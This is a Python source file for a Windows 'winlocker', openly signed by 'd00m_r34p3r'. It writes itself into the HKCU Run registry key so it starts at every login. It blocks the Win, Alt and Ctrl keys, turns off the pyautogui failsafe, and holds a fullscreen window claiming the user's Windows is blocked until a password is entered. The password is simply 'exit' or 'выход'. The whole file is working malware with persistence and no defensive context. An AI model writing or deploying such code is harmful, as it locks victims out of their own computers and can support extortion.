import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
import winreg as reg
import os   
import keyboard
import sys

def add_to_reg():
    s_name = sys.argv[0]

    dir_path = ''
    if getattr(sys, 'frozen', False):
        dir_path = os.path.dirname(sys.executable)
    else:
        dir_path = os.path.dirname(os.path.realpath(__file__))
    address = os.path.join(dir_path, s_name)

    key = reg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        open = reg.OpenKey(key, key_value, 0, reg.KEY_READ)
        value, _ = reg.QueryValueEx(open, s_name)
        if value == address:
            reg.CloseKey(open)
            return
        reg.CloseKey(open)
    except WindowsError:
        pass
    
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, s_name, 0, reg.REG_SZ, address)
    reg.CloseKey(open)

        
def callback(event):
    global k, entry
    if entry.get() == 'exit' or entry.get() == 'выход':
        k = True

def on_closing():
    moveTo(width/2, height/2)
    root.attributes('-fullscreen', True)
    root.protocol('WM_DELETE_WINDOW', on_closing)
    root.update()
    root.bind('<Return>', callback)

keyboard.block_key('win')
keyboard.block_key('alt')
keyboard.block_key('ctrl')


if __name__=='__main__':
    add_to_reg()
    
    root = Tk()
    
    root.config(bg="black")
    pyautogui.FAILSAFE = False

    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()

    root.attributes('-fullscreen', True)

    entry = Entry(root, font=1)
    entry.place(width=150, height=50, x=width/2-75, y=height/2-25)

    label0 = Label(root, text='From d00m_r34p3r with love (J°0°)J', bg="black", fg="green", font=1)
    label0.grid(row=0, column=0)

    label1 = Label(root, text='Your windows was blocked! To unblock, enter password and press \'Enter\'', bg="black", fg="green", font='Arial 20')
    label1.place(x=width/3, y=height/2-25-100)

    root.update()
    sleep(0.2)

    k=False

    while not k: 
        on_closing()